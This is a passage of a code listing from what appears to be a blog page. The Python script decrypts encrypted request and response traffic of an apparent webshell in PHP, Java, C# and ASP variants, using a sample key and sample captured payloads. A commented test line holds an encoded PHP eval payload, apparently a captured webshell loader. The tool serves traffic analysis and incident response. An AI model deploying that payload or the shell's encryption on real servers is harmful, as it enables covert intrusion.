class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br><span class=\"line\">304</span><br><span class=\"line\">305</span><br><span class=\"line\">306</span><br><span class=\"line\">307</span><br><span class=\"line\">308</span><br><span class=\"line\">309</span><br><span class=\"line\">310</span><br><span class=\"line\">311</span><br><span class=\"line\">312</span><br><span class=\"line\">313</span><br><span class=\"line\">314</span><br><span class=\"line\">315</span><br><span class=\"line\">316</span><br><span class=\"line\">317</span><br><span class=\"line\">318</span><br><span class=\"line\">319</span><br><span class=\"line\">320</span><br><span class=\"line\">321</span><br><span class=\"line\">322</span><br><span class=\"line\">323</span><br><span class=\"line\">324</span><br><span class=\"line\">325</span><br><span class=\"line\">326</span><br><span class=\"line\">327</span><br><span class=\"line\">328</span><br><span class=\"line\">329</span><br><span class=\"line\">330</span><br><span class=\"line\">331</span><br><span class=\"line\">332</span><br><span class=\"line\">333</span><br><span class=\"line\">334</span><br><span class=\"line\">335</span><br><span class=\"line\">336</span><br><span class=\"line\">337</span><br><span class=\"line\">338</span><br><span class=\"line\">339</span><br><span class=\"line\">340</span><br><span class=\"line\">341</span><br><span class=\"line\">342</span><br><span class=\"line\">343</span><br><span class=\"line\">344</span><br><span class=\"line\">345</span><br><span class=\"line\">346</span><br><span class=\"line\">347</span><br><span class=\"line\">348</span><br><span class=\"line\">349</span><br><span class=\"line\">350</span><br><span class=\"line\">351</span><br><span class=\"line\">352</span><br><span class=\"line\">353</span><br><span class=\"line\">354</span><br><span class=\"line\">355</span><br><span class=\"line\">356</span><br><span class=\"line\">357</span><br><span class=\"line\">358</span><br><span class=\"line\">359</span><br><span class=\"line\">360</span><br><span class=\"line\">361</span><br><span class=\"line\">362</span><br><span class=\"line\">363</span><br><span class=\"line\">364</span><br><span class=\"line\">365</span><br><span class=\"line\">366</span><br><span class=\"line\">367</span><br><span class=\"line\">368</span><br><span class=\"line\">369</span><br><span class=\"line\">370</span><br><span class=\"line\">371</span><br><span class=\"line\">372</span><br><span class=\"line\">373</span><br><span class=\"line\">374</span><br><span class=\"line\">375</span><br><span class=\"line\">376</span><br><span class=\"line\">377</span><br><span class=\"line\">378</span><br><span class=\"line\">379</span><br><span class=\"line\">380</span><br><span class=\"line\">381</span><br><span class=\"line\">382</span><br><span class=\"line\">383</span><br><span class=\"line\">384</span><br><span class=\"line\">385</span><br><span class=\"line\">386</span><br><span class=\"line\">387</span><br><span class=\"line\">388</span><br><span class=\"line\">389</span><br><span class=\"line\">390</span><br><span class=\"line\">391</span><br><span class=\"line\">392</span><br><span class=\"line\">393</span><br><span class=\"line\">394</span><br><span class=\"line\">395</span><br><span class=\"line\">396</span><br><span class=\"line\">397</span><br><span class=\"line\">398</span><br><span class=\"line\">399</span><br><span class=\"line\">400</span><br><span class=\"line\">401</span><br><span class=\"line\">402</span><br><span class=\"line\">403</span><br><span class=\"line\">404</span><br><span class=\"line\">405</span><br><span class=\"line\">406</span><br><span class=\"line\">407</span><br><span class=\"line\">408</span><br><span class=\"line\">409</span><br><span class=\"line\">410</span><br><span class=\"line\">411</span><br><span class=\"line\">412</span><br><span class=\"line\">413</span><br><span class=\"line\">414</span><br><span class=\"line\">415</span><br><span class=\"line\">416</span><br><span class=\"line\">417</span><br><span class=\"line\">418</span><br><span class=\"line\">419</span><br><span class=\"line\">420</span><br><span class=\"line\">421</span><br><span class=\"line\">422</span><br><span class=\"line\">423</span><br><span class=\"line\">424</span><br><span class=\"line\">425</span><br><span class=\"line\">426</span><br><span class=\"line\">427</span><br><span class=\"line\">428</span><br><span class=\"line\">429</span><br><span class=\"line\">430</span><br><span class=\"line\">431</span><br><span class=\"line\">432</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import base64</span><br><span class=\"line\">import gzip</span><br><span class=\"line\">import re</span><br><span class=\"line\">from urllib.parse import unquote</span><br><span class=\"line\">from Crypto.Cipher import AES</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def unpad(s):</span><br><span class=\"line\">    return s[:-ord(s[len(s) - 1:])]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def XOR(D, K):</span><br><span class=\"line\">    result = []</span><br><span class=\"line\">    for i in range(len(D)):</span><br><span class=\"line\">        c = K[i + 1 &amp; 15]</span><br><span class=\"line\">        if not isinstance(D[i], int):</span><br><span class=\"line\">            d = ord(D[i])</span><br><span class=\"line\">        else:</span><br><span class=\"line\">            d = D[i]</span><br><span class=\"line\">        result.append(d ^ ord(c))</span><br><span class=\"line\">    return b&#x27;&#x27;.join([i.to_bytes(1, byteorder=&#x27;big&#x27;) for i in result])</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class PHP_XOR_BASE64:</span><br><span class=\"line\">    def __init__(self, pass_, key):</span><br><span class=\"line\">        self.pass_ = pass_</span><br><span class=\"line\">        self.key = key</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_req_payload(self, payload):</span><br><span class=\"line\">        payload = payload.decode().split(self.pass_ + &#x27;=&#x27;)[1]</span><br><span class=\"line\">        return XOR(base64.b64decode(unquote(payload)), self.key)</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_res_payload(self, payload):</span><br><span class=\"line\">        payload = payload[16:-16]</span><br><span class=\"line\">        return gzip.decompress(XOR(base64.b64decode(payload.decode()), self.key))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class PHP_XOR_RAW:</span><br><span class=\"line\">    def __init__(self, pass_, key):</span><br><span class=\"line\">        self.pass_ = pass_</span><br><span class=\"line\">        self.key = key</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_req_payload(self, payload):</span><br><span class=\"line\">        return XOR(payload, self.key)</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_res_payload(self, payload):</span><br><span class=\"line\">        return gzip.decompress(XOR(payload, self.key))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class PHP_EVAL_XOR_BASE64:</span><br><span class=\"line\">    def __init__(self, pass_, key):</span><br><span class=\"line\">        self.pass_ = pass_</span><br><span class=\"line\">        self.key = key</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_req_payload(self, payload):</span><br><span class=\"line\">        body = unquote(payload.decode())</span><br><span class=\"line\">        match = re.findall(r&quot;eval\\(base64_decode\\(strrev\\(urldecode\\(&#x27;(.*)&#x27;\\)&quot;, str(body))</span><br><span class=\"line\">        # encode_body = regexphp(,body)</span><br><span class=\"line\">        tmp = reversed(match[0])</span><br><span class=\"line\">        tmp_base64 = &#x27;&#x27;.join(tmp)</span><br><span class=\"line\">        return base64.b64decode(tmp_base64)</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_res_payload(self, payload):</span><br><span class=\"line\">        payload = payload[16:-16]</span><br><span class=\"line\">        return gzip.decompress(XOR(base64.b64decode(payload.decode()), self.key))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class JAVA_AES_BASE64:</span><br><span class=\"line\">    def __init__(self, pass_, key):</span><br><span class=\"line\">        self.pass_ = pass_</span><br><span class=\"line\">        self.key = key</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_req_payload(self, payload):</span><br><span class=\"line\">        payload = payload.decode().split(self.pass_ + &#x27;=&#x27;)[1]</span><br><span class=\"line\">        encrypted_text = base64.b64decode(unquote(payload))</span><br><span class=\"line\"></span><br><span class=\"line\">        cipher = AES.new(key=self.key.encode(), mode=AES.MODE_ECB)</span><br><span class=\"line\">        decrypted_text = cipher.decrypt(encrypted_text)</span><br><span class=\"line\">        decrypted_text = unpad(decrypted_text)</span><br><span class=\"line\">        try:</span><br><span class=\"line\">            decrypted_text = gzip.decompress(decrypted_text)</span><br><span class=\"line\">        except:</span><br><span class=\"line\">            pass</span><br><span class=\"line\">        return decrypted_text</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_res_payload(self, payload):</span><br><span class=\"line\">        payload = payload.decode()</span><br><span class=\"line\">        payload = payload[16:-16]</span><br><span class=\"line\">        encrypted_text = base64.b64decode(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">        cipher = AES.new(key=self.key.encode(), mode=AES.MODE_ECB)</span><br><span class=\"line\">        decrypted_text = cipher.decrypt(encrypted_text)</span><br><span class=\"line\">        decrypted_text = unpad(decrypted_text)</span><br><span class=\"line\">        return gzip.decompress(decrypted_text)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class JAVA_AES_RAW:</span><br><span class=\"line\">    def __init__(self, pass_, key):</span><br><span class=\"line\">        self.pass_ = pass_</span><br><span class=\"line\">        self.key = key</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_req_payload(self, payload):</span><br><span class=\"line\">        &quot;&quot;&quot;&quot;16进制字符串: d26414f92d691674f3dedb554e70202550ff681c03dcd3572f74df4c4c68d7078abb82808610aee869f51107d7d66f60&quot;&quot;&quot;</span><br><span class=\"line\">        encrypted_text = payload</span><br><span class=\"line\"></span><br><span class=\"line\">        cipher = AES.new(key=self.key.encode(), mode=AES.MODE_ECB)</span><br><span class=\"line\">        decrypted_text = cipher.decrypt(encrypted_text)</span><br><span class=\"line\">        decrypted_text = unpad(decrypted_text)</span><br><span class=\"line\">        try:</span><br><span class=\"line\">            decrypted_text = gzip.decompress(decrypted_text)</span><br><span class=\"line\">        except:</span><br><span class=\"line\">            pass</span><br><span class=\"line\">        return decrypted_text</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_res_payload(self, payload):</span><br><span class=\"line\">        encrypted_text = payload</span><br><span class=\"line\"></span><br><span class=\"line\">        cipher = AES.new(key=self.key.encode(), mode=AES.MODE_ECB)</span><br><span class=\"line\">        decrypted_text = cipher.decrypt(encrypted_text)</span><br><span class=\"line\">        decrypted_text = unpad(decrypted_text)</span><br><span class=\"line\">        return gzip.decompress(decrypted_text)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class CSHAP_AES_BASE64:</span><br><span class=\"line\">    def __init__(self, pass_, key):</span><br><span class=\"line\">        self.pass_ = pass_</span><br><span class=\"line\">        self.key = key</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_req_payload(self, payload):</span><br><span class=\"line\">        payload = payload.decode().split(self.pass_ + &#x27;=&#x27;)[1]</span><br><span class=\"line\">        encrypted_text = base64.b64decode(unquote(payload))</span><br><span class=\"line\"></span><br><span class=\"line\">        cipher = AES.new(key=self.key.encode(), mode=AES.MODE_CBC, iv=self.key.encode())</span><br><span class=\"line\">        decrypted_text = cipher.decrypt(encrypted_text)</span><br><span class=\"line\">        decrypted_text = unpad(decrypted_text)</span><br><span class=\"line\">        try:</span><br><span class=\"line\">            decrypted_text = gzip.decompress(decrypted_text)</span><br><span class=\"line\">        except:</span><br><span class=\"line\">            pass</span><br><span class=\"line\">        return decrypted_text</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_res_payload(self, payload):</span><br><span class=\"line\">        payload = payload.decode()</span><br><span class=\"line\">        payload = payload[16:-16]</span><br><span class=\"line\">        encrypted_text = base64.b64decode(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">        cipher = AES.new(key=self.key.encode(), mode=AES.MODE_CBC, iv=self.key.encode())</span><br><span class=\"line\">        decrypted_text = cipher.decrypt(encrypted_text)</span><br><span class=\"line\">        decrypted_text = unpad(decrypted_text)</span><br><span class=\"line\">        return gzip.decompress(decrypted_text)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class CSHAP_EVAL_AES_BASE64:</span><br><span class=\"line\">    def __init__(self, pass_, key):</span><br><span class=\"line\">        self.pass_ = pass_</span><br><span class=\"line\">        self.key = key</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_req_payload(self, payload):</span><br><span class=\"line\">        body = unquote(payload.decode())</span><br><span class=\"line\">        match = re.findall(r&quot;HttpUtility.UrlDecode\\(&#x27;(.*)&#x27;\\)\\)\\)&quot;, str(body))</span><br><span class=\"line\">        tmp = match[0]</span><br><span class=\"line\">        decrypted_text = base64.b64decode(tmp)</span><br><span class=\"line\"></span><br><span class=\"line\">        return decrypted_text</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_res_payload(self, payload):</span><br><span class=\"line\">        payload = payload.decode()</span><br><span class=\"line\">        payload = payload[16:-16]</span><br><span class=\"line\">        encrypted_text = base64.b64decode(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">        cipher = AES.new(key=self.key.encode(), mode=AES.MODE_CBC, iv=self.key.encode())</span><br><span class=\"line\">        decrypted_text = cipher.decrypt(encrypted_text)</span><br><span class=\"line\">        decrypted_text = unpad(decrypted_text)</span><br><span class=\"line\">        return gzip.decompress(decrypted_text)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class CSHAP_ASMX_AES_BASE64:</span><br><span class=\"line\">    def __init__(self, pass_, key):</span><br><span class=\"line\">        self.pass_ = pass_</span><br><span class=\"line\">        self.key = key</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_req_payload(self, payload):</span><br><span class=\"line\">        body = payload.decode()</span><br><span class=\"line\">        match = re.findall(r&quot;&lt;&#123;&#125;&gt;(.*?)&lt;/&#123;&#125;&gt;&quot;.format(self.pass_, self.pass_), str(body))</span><br><span class=\"line\"></span><br><span class=\"line\">        encrypted_text = base64.b64decode(unquote(match[0]))</span><br><span class=\"line\"></span><br><span class=\"line\">        cipher = AES.new(key=self.key.encode(), mode=AES.MODE_CBC, iv=self.key.encode())</span><br><span class=\"line\">        decrypted_text = cipher.decrypt(encrypted_text)</span><br><span class=\"line\">        decrypted_text = unpad(decrypted_text)</span><br><span class=\"line\">        try:</span><br><span class=\"line\">            decrypted_text = gzip.decompress(decrypted_text)</span><br><span class=\"line\">        except:</span><br><span class=\"line\">            pass</span><br><span class=\"line\">        return decrypted_text</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_res_payload(self, payload):</span><br><span class=\"line\">        body = payload.decode()</span><br><span class=\"line\">        match = re.findall(r&quot;&lt;&#123;&#125;Result&gt;(.*?)&lt;/&#123;&#125;Result&gt;&quot;.format(self.pass_, self.pass_), str(body))</span><br><span class=\"line\"></span><br><span class=\"line\">        payload = match[0][16:-16]</span><br><span class=\"line\">        encrypted_text = base64.b64decode(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">        cipher = AES.new(key=self.key.encode(), mode=AES.MODE_CBC, iv=self.key.encode())</span><br><span class=\"line\">        decrypted_text = cipher.decrypt(encrypted_text)</span><br><span class=\"line\">        decrypted_text = unpad(decrypted_text)</span><br><span class=\"line\">        return gzip.decompress(decrypted_text)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class CSHAP_AES_RAW:</span><br><span class=\"line\">    def __init__(self, pass_, key):</span><br><span class=\"line\">        self.pass_ = pass_</span><br><span class=\"line\">        self.key = key</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_req_payload(self, payload):</span><br><span class=\"line\">        encrypted_text = payload</span><br><span class=\"line\"></span><br><span class=\"line\">        cipher = AES.new(key=self.key.encode(), mode=AES.MODE_CBC, iv=self.key.encode())</span><br><span class=\"line\">        decrypted_text = cipher.decrypt(encrypted_text)</span><br><span class=\"line\">        decrypted_text = unpad(decrypted_text)</span><br><span class=\"line\">        try:</span><br><span class=\"line\">            decrypted_text = gzip.decompress(decrypted_text)</span><br><span class=\"line\">        except:</span><br><span class=\"line\">            pass</span><br><span class=\"line\">        return decrypted_text</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_res_payload(self, payload):</span><br><span class=\"line\">        encrypted_text = payload</span><br><span class=\"line\"></span><br><span class=\"line\">        cipher = AES.new(key=self.key.encode(), mode=AES.MODE_CBC, iv=self.key.encode())</span><br><span class=\"line\">        decrypted_text = cipher.decrypt(encrypted_text)</span><br><span class=\"line\">        decrypted_text = unpad(decrypted_text)</span><br><span class=\"line\">        return gzip.decompress(decrypted_text)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class ASP_BASE64:</span><br><span class=\"line\">    def __init__(self, pass_, key):</span><br><span class=\"line\">        self.pass_ = pass_</span><br><span class=\"line\">        self.key = key</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_req_payload(self, payload):</span><br><span class=\"line\">        payload = payload.decode().split(self.pass_ + &#x27;=&#x27;)[1]</span><br><span class=\"line\">        return base64.b64decode(unquote(payload))</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_res_payload(self, payload):</span><br><span class=\"line\">        payload = payload.decode()</span><br><span class=\"line\">        payload = payload[6:-6]</span><br><span class=\"line\">        return base64.b64decode((payload))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class ASP_EVAL_BASE64:</span><br><span class=\"line\">    def __init__(self, pass_, key):</span><br><span class=\"line\">        self.pass_ = pass_</span><br><span class=\"line\">        self.key = key</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_req_payload(self, payload):</span><br><span class=\"line\">        body = unquote(payload.decode())</span><br><span class=\"line\">        match = re.findall(r&#x27;bd\\(&quot;&quot;&quot;&quot;(.*?)&quot;&quot;&quot;&quot;\\)&#x27;, str(body))</span><br><span class=\"line\">        tmp = bytes(bytearray.fromhex(match[0]))</span><br><span class=\"line\">        return tmp</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_res_payload(self, payload):</span><br><span class=\"line\">        payload = payload[6:-6]</span><br><span class=\"line\">        return base64.b64decode((payload))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class ASP_RAW:</span><br><span class=\"line\">    def __init__(self, pass_, key):</span><br><span class=\"line\">        self.pass_ = pass_</span><br><span class=\"line\">        self.key = key</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_req_payload(self, payload):</span><br><span class=\"line\">        return payload</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_res_payload(self, payload):</span><br><span class=\"line\">        return payload</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class ASP_XOR_BASE64:</span><br><span class=\"line\">    def __init__(self, pass_, key):</span><br><span class=\"line\">        self.pass_ = pass_</span><br><span class=\"line\">        self.key = key</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_req_payload(self, payload):</span><br><span class=\"line\">        payload = payload.decode().split(self.pass_ + &#x27;=&#x27;)[1]</span><br><span class=\"line\">        return XOR(base64.b64decode(unquote(payload)), self.key)</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_res_payload(self, payload):</span><br><span class=\"line\">        payload = payload.decode()</span><br><span class=\"line\">        payload = payload[6:-6]</span><br><span class=\"line\">        return XOR(base64.b64decode(payload), self.key)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class ASP_XOR_RAW:</span><br><span class=\"line\">    def __init__(self, pass_, key):</span><br><span class=\"line\">        self.pass_ = pass_</span><br><span class=\"line\">        self.key = key</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_req_payload(self, payload):</span><br><span class=\"line\">        return XOR(payload, self.key)</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_res_payload(self, payload):</span><br><span class=\"line\">        return XOR(payload, self.key)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">    decrypter = PHP_XOR_BASE64(pass_=&#x27;pass&#x27;, key=&#x27;3c6e0b8a9c15224a&#x27;)</span><br><span class=\"line\">    data = decrypter.decrypt_req_payload(b&#x27;pass=DlMRWA1cL1gOVDc2MjRhRwZFEQ==&#x27;)</span><br><span class=\"line\">    print(data)</span><br><span class=\"line\">    data = decrypter.decrypt_res_payload(b&#x27;72a9c691ccdaab98fL1tMGI4YTljO/79NDQm7r9PZzBiOA==b4c4e1f6ddd2a488&#x27;)</span><br><span class=\"line\">    print(data)</span><br><span class=\"line\"></span><br><span class=\"line\">    # php_xor_raw_req = &#x27;0e5311580d5c2f580e54373632346147064511&#x27;</span><br><span class=\"line\">    # php_xor_raw_res = &#x27;7cbd6d3062386139633bfefd343426eebf4f67306238&#x27;</span><br><span class=\"line\">    # decrypter = PHP_XOR_RAW(pass_=&#x27;pass&#x27;, key=&#x27;3c6e0b8a9c15224a&#x27;)</span><br><span class=\"line\">    # data = decrypter.decrypt_req_payload(bytes(bytearray.fromhex(php_xor_raw_req)))</span><br><span class=\"line\">    # print(data)</span><br><span class=\"line\">    # data = decrypter.decrypt_res_payload(bytes(bytearray.fromhex(php_xor_raw_res)))</span><br><span class=\"line\">    # print(data)</span><br><span class=\"line\"></span><br><span class=\"line\">    # decrypter = PHP_EVAL_XOR_BASE64(pass_=&#x27;pass&#x27;, key=&#x27;3c6e0b8a9c15224a&#x27;)</span><br><span class=\"line\">    # data = decrypter.decrypt_req_payload(b&#x27;pass=eval%28base64_decode%28strrev%28urldecode%28%27K0QfK0QfgACIgoQD9BCIgACIgACIK0wOpkXZrRCLhRXYkRCKlR2bj5WZ90VZtFmTkF2bslXYwRyWO9USTNVRT9FJgACIgACIgACIgACIK0wepU2csFmZ90TIpIybm5WSzNWazFmQ0V2ZiwSY0FGZkgycvBnc0NHKgYWagACIgACIgAiCNsXZzxWZ9BCIgAiCNsTK2EDLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKpkXZrRCLpEGdhRGJo4WdyBEKlR2bj5WZoUGZvNmbl9FN2U2chJGIvh2YlBCIgACIgACIK0wOpYTMsADLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKkF2bslXYwRCKsFmdllQCK0QfgACIgACIgAiCNsTK5V2akwCZh9Gb5FGckgSZk92YuVWPkF2bslXYwRCIgACIgACIgACIgAiCNsXKlNHbhZWP90TKi8mZul0cjl2chJEdldmIsQWYvxWehBHJoM3bwJHdzhCImlGIgACIgACIgoQD7kSeltGJs0VZtFmTkF2bslXYwRyWO9USTNVRT9FJoUGZvNmbl1DZh9Gb5FGckACIgACIgACIK0wepkSXl1WYORWYvxWehBHJb50TJN1UFN1XkgCdlN3cphCImlGIgACIK0wOpkXZrRCLp01czFGcksFVT9EUfRCKlR2bjVGZfRjNlNXYihSZk92YuVWPhRXYkRCIgACIK0wepkSXzNXYwRyWUN1TQ9FJoQXZzNXaoAiZppQD7cSY0IjM1EzY5EGOiBTZ2M2Mn0TeltGJK0wOnQWYvxWehB3J9UWbh5EZh9Gb5FGckoQD7cSelt2J9M3chBHJK0QfK0wOERCIuJXd0VmcgACIgoQD9BCIgAiCNszYk4VXpRyWERCI9ASXpRyWERCIgACIgACIgoQD70VNxYSMrkGJbtEJg0DIjRCIgACIgACIgoQD7BSKrsSaksTKERCKuVGbyR3c8kGJ7ATPpRCKy9mZgACIgoQD7lySkwCRkgSZk92YuVGIu9Wa0Nmb1ZmCNsTKwgyZulGdy9GclJ3Xy9mcyVGQK0wOpADK0lWbpx2Xl1Wa09FdlNHQK0wOpgCdyFGdz9lbvl2czV2cApQD%27%29%29%29%29%3B&amp;key=DlMRWA1cL1gOVDc2MjRhRwZFEQ%3D%3D&#x27;)</span><br><span class=\"line\">    # print(data)</span><br><span class=\"line\">    # exit()</span><br><span class=\"line\">    # data = decrypter.decrypt_res_payload(b&#x27;72a9c691ccdaab98fL1tMGI4YTljO/79NDQm7r9PZzBiOA==b4c4e1f6ddd2a488&#x27;)</span><br><span class=\"line\">    # print(data)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    # decrypter = JAVA_AES_RAW(pass_=&#x27;pass&#x27;, key=&#x27;3c6e0b8a9c15224a&#x27;)</span><br><span class=\"line\">    # java_raw_req = &#x27;d26414f92d691674f3dedb554e70202550ff681c03dcd3572f74df4c4c68d7078abb82808610aee869f51107d7d66f60&#x27;</span><br><span class=\"line\">    # java_raw_res = &#x27;2c5fc8a643ef334889238c26a41b360daa0156f71b0cca70b8bee7612de7fe4e&#x27;</span><br><span class=\"line\">    # data = decrypter.decrypt_req_payload(bytes(bytearray.fromhex(java_raw_req)))</span><br><span class=\"line\">    # print(data)</span><br><span class=\"line\">    # data = decrypter.decrypt_res_payload(bytes(bytearray.fromhex(java_raw_res)))</span><br><span class=\"line\">    # print(data)</span><br><span class=\"line\"></span><br><span class=\"line\">    decrypter = JAVA_AES_BASE64(pass_=&#x27;pass&#x27;, key=&#x27;3c6e0b8a9c15224a&#x27;)</span><br><span class=\"line\">    data = 